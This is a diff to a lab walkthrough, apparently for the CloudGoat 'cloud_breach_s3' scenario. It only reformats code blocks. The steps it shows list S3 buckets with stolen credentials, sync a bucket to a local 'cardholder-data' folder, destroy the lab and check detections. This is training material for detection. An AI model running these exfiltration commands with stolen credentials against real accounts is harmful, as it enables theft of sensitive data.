@@ -296,7 +296,11 @@ bucket.
       :alt: sestoken
 
 -  List and search buckets the stolen credentails have access to
-   .. code:: bash  aws s3 ls --profile cloud_breach_s3
+
+   .. code:: bash
+   
+      aws s3 ls --profile cloud_breach_s3
+   
    .. figure:: ./images/list.png
    
 
@@ -306,16 +310,20 @@ bucket.
 
    .. code:: bash  
    
-   aws s3 sync s3://<bucket-name> ~/cardholder-data --profile cloud_breach_s3
+      aws s3 sync s3://<bucket-name> ~/cardholder-data --profile cloud_breach_s3
 
 -  Change to home directory and perfom list to verify data was
    downloaded 
+   
    .. code:: bash 
-   cd && ls
+   
+      cd && ls
+   
    .. figure:: ./images/download.png
 
 -  Remove vulnerable infrasturecure
+
    .. code:: 
-   bash ~/cloudgoat/cloudgoat.py destroy cloud_breach_s3
+      bash ~/cloudgoat/cloudgoat.py destroy cloud_breach_s3
 
 -  Attack had been completed. Review the detections in dfaws dashboard.
